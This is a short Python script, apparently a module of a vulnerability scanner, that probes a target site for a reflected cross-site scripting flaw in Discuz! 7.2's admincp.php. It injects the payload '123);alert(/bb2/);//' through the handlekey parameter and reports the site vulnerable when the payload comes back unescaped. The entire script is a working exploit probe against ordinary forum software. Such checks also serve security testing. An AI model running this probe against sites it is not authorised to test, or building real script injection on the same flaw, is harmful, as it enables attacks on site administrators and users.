#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]


def main():
    res = HttpGet(url+"/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);//","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find("return_123);alert(/bb2/);//")!=-1:
        print(Result+url+"/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);// 目标存在Discuz! 7.2 /admincp.php |跨站脚本漏洞");


main()
